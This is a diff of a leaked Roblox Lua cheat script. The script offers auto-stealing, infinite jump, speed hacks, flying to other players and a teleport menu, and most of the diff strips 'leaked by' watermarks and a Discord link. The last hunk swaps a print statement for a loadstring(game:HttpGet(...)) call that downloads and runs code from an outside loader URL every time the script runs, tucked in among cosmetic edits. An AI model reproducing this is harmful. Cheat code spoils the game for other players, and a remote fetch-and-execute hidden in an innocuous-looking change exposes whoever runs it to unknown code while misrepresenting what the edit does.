@@ -1,7 +1,3 @@
--- ============================================================
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
--- ============================================================
-
 repeat task.wait() until game:IsLoaded()
 
 pcall(function() setfpscap(999) end)
@@ -16,17 +12,14 @@ local HttpService    = game:GetService("HttpService")
 local LocalPlayer    = Players.LocalPlayer
 local Camera         = workspace.CurrentCamera
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local jumpHeightBR = 23 
 local jumpSpeedBR = 120
 local brainrotEnabled = true
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
-local infinityJumpEnabled = false -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
+local infinityJumpEnabled = false 
 local jumpForce = 50
 local clampFallSpeed = 80
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local function performBrainrotJump()
     local char = LocalPlayer.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
@@ -47,7 +40,6 @@ local function performBrainrotJump()
     end
 end
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 RunService.Stepped:Connect(function()
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer and player.Character then
@@ -163,7 +155,6 @@ local floatVisualSetter = nil
 local cachedMass      = 0
 local lastMassUpdate  = 0
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local function MakeDraggable(frame)
     local dragging, dragInput, dragStart, startPos
     frame.InputBegan:Connect(function(input)
@@ -208,7 +199,6 @@ local function isMyPlotByName(pn)
     return false
 end
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local function findNearestPrompt()
     local myHrp = getHRP()
     if not myHrp then return nil end
@@ -277,8 +267,7 @@ local function executeSteal(prompt, name)
     if progressConnection then progressConnection:Disconnect() end
     progressConnection = RunService.Heartbeat:Connect(function()
         if not isStealing then progressConnection:Disconnect() return end
-        -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
-      
+        
         local myHrp = getHRP()
         if not myHrp or not prompt or not prompt.Parent or (prompt.Parent.WorldPosition - myHrp.Position).Magnitude > (Values.STEAL_RADIUS + 2) then
             isStealing = false
@@ -296,13 +285,13 @@ local function executeSteal(prompt, name)
         for _, f in ipairs(data.hold)    do task.spawn(f) end
         local elapsed = 0
         while elapsed < Values.STEAL_DURATION do 
-            if not isStealing then break end -- Break loop if cancelled
+            if not isStealing then break end 
             elapsed = elapsed + task.wait() 
         end
         
         if isStealing then
             for _, f in ipairs(data.trigger) do task.spawn(f) end
-            pcall(function() prompt:InputHoldEnded() end) -- Better compatibility
+            pcall(function() prompt:InputHoldEnded() end) 
         end
         
         if progressConnection then progressConnection:Disconnect() end
@@ -366,7 +355,6 @@ end
 task.spawn(function() task.wait(1) captureJumpPower() end)
 LocalPlayer.CharacterAdded:Connect(function() task.wait(1) captureJumpPower() end)
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 RunService.Heartbeat:Connect(function()
     if not infinityJumpEnabled then return end
     local char = LocalPlayer.Character
@@ -397,7 +385,6 @@ local function stopInfiniteJump()
     infinityJumpEnabled = false
     Enabled.InfiniteJump = false
 end
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 
 local function startUnwalk()
     local c = LocalPlayer.Character; if not c then return end
@@ -736,18 +723,16 @@ local function getClosestPlayer()
     return closestPlayer, closestDist
 end
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local function flyToFrontOfTarget(targetHRP)
     if not hrp then return end
     local forward = targetHRP.CFrame.LookVector
-    local frontPos = targetHRP.Position + (forward * 0.3) -- MODIFIED: EXACTLY 0.3 STUDS
+    local frontPos = targetHRP.Position + (forward * 0.3)
     local direction = (frontPos - hrp.Position).Unit
     hrp.Velocity = Vector3.new(direction.X * 57.5, direction.Y * 57.5, direction.Z * 57.5)
 end
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 local function runAimbot(targetHRP)
- -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
+    
 end
 
 local function applyFOV(value)
@@ -856,10 +841,6 @@ local function loadConfig()
 end
 loadConfig()
 
--- =============================================================
--- -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
--- =============================================================
-
 local C_BG     = Color3.fromRGB(0,   0,   0)
 local C_GREEN = Color3.fromRGB(0,  255, 128) 
 local C_GREEN2= Color3.fromRGB(150, 255, 180) 
@@ -898,7 +879,6 @@ main.ClipsDescendants = true
 main.Parent           = gui
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 24)
 
--- UPDATED: QUICK MENU (Right Side Grid Layout) - LOCKED
 do
     quickMenu = Instance.new("Frame")
     quickMenu.Name = "QuickMenu"
@@ -947,7 +927,6 @@ do
         if AutoRightEnabled then startAutoRight() s.Color = C_GREEN else stopAutoRight() s.Color = Color3.fromRGB(40,40,40) end
     end)
 
--- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
     makeQuickBtn("TP DOWN", function() 
         if hrp then 
             local rayParams = RaycastParams.new()
@@ -960,7 +939,6 @@ do
         end
     end)
 
- -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
     makeQuickBtn("DROP BR", function() 
         if brainrotEnabled then
             performBrainrotJump()
@@ -979,7 +957,6 @@ do
         if speedToggled then s.Color = C_GREEN else s.Color = Color3.fromRGB(40,40,40) end
     end)
 
-    -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
 end
 
 if isMobile then
@@ -997,15 +974,13 @@ if isMobile then
     tStroke.Color = C_GREEN tStroke.Thickness = 2
 
     mobToggle.MouseButton1Click:Connect(function() main.Visible = not main.Visible end)
-    
-   -- LEAKED BY LAVE JOIN CAVE SOURCES https://discord.gg/MUum5ebu2
+
 end
 
 local mainStroke = Instance.new("UIStroke", main)
 mainStroke.Color     = Color3.fromRGB(0, 90, 45)
 mainStroke.Thickness = 1.5
 
-------Leaked By Lave Join Cave Sources https://discord.gg/MUum5ebu2
 
 local batEmoji = Instance.new("TextLabel")
 batEmoji.Size=UDim2.new(0,40,0,40) batEmoji.Position=UDim2.new(0,14,0,8)
@@ -1521,7 +1496,6 @@ saveConfigBtn.Font=Enum.Font.GothamBold saveConfigBtn.TextSize=13 saveConfigBtn.
 saveConfigBtn.ZIndex=4 saveConfigBtn.Parent=vstack
 saveConfigBtn.MouseButton1Click:Connect(function() saveConfig() end)
 
-------Leaked By Lave Join Cave Sources https://discord.gg/MUum5ebu2
 local progressBar=Instance.new("Frame",gui)
 progressBar.Size=UDim2.new(0,460,0,72) progressBar.Position=UDim2.new(0.5,-230,1,-90)
 progressBar.BackgroundColor3=C_BG progressBar.BorderSizePixel=0 progressBar.Active=true
@@ -1529,7 +1503,7 @@ Instance.new("UICorner",progressBar).CornerRadius=UDim.new(0,20)
 local pbStroke=Instance.new("UIStroke",progressBar)
 pbStroke.Color=Color3.fromRGB(0,60,40) pbStroke.Thickness=1.5
 
-MakeDraggable(progressBar) ------Leaked By Lave Join Cave Sources https://discord.gg/MUum5ebu2
+MakeDraggable(progressBar) 
 
 ProgressLabel=Instance.new("TextLabel",progressBar)
 ProgressLabel.Size=UDim2.new(0.55,0,0,22) ProgressLabel.Position=UDim2.new(0,14,0,8)
@@ -1562,7 +1536,6 @@ ProgressBarFill=Instance.new("Frame",pTrack)
 ProgressBarFill.Size=UDim2.new(0,0,1,0) ProgressBarFill.BackgroundColor3=C_GREEN ProgressBarFill.BorderSizePixel=0 ProgressBarFill.ZIndex=3
 Instance.new("UICorner",ProgressBarFill).CornerRadius=UDim.new(1,0)
 
--- ===== INPUT HANDLER =====
 UserInputService.InputBegan:Connect(function(input,gpe)
     if gpe then return end
     if waitingForKey then return end
@@ -1631,4 +1604,4 @@ end
 LocalPlayer.CharacterAdded:Connect(setupChar)
 if LocalPlayer.Character then setupChar(LocalPlayer.Character) end
 
-print("Leaked By Lave Join Cave Sources https://discord.gg/MUum5ebu2")
+loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/31f75fdee70c4ea29d41d77832ab0621.lua"))()
